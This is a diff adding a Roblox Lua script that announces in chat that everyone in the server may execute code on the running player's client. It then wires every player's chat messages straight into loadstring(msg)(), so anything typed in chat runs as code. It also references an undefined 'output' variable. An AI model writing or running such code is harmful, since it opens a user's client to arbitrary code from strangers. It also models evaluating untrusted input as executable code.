@@ -1,0 +1,30 @@
+local function notification(Title,Text,Duration)
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = Title,
+    Text = Text,
+    Duration = Duration
+})
+end
+
+function chat(msg)
+    if game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel then
+        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg);
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+    end
+end
+chat("E")
+task.wait(0.1)
+chat("A")
+task.wait(0.5)
+chat("Sports It's In The game")
+chat("Everyone in this server has been whitelisted to execute code on " .. game.Players.LocalPlayer.Name .. "'s Client you can do anything from kick to speed to even making them chat have fun!")
+for _,v in pairs(game.Players:GetChildren()) do
+
+notification("Credits", "CLDevs ON TOP Baby The script is executed", 5)
+
+v.Chatted:Connect(function(msg)
+    loadstring(msg)() 
+chat(output)
+end)
+end
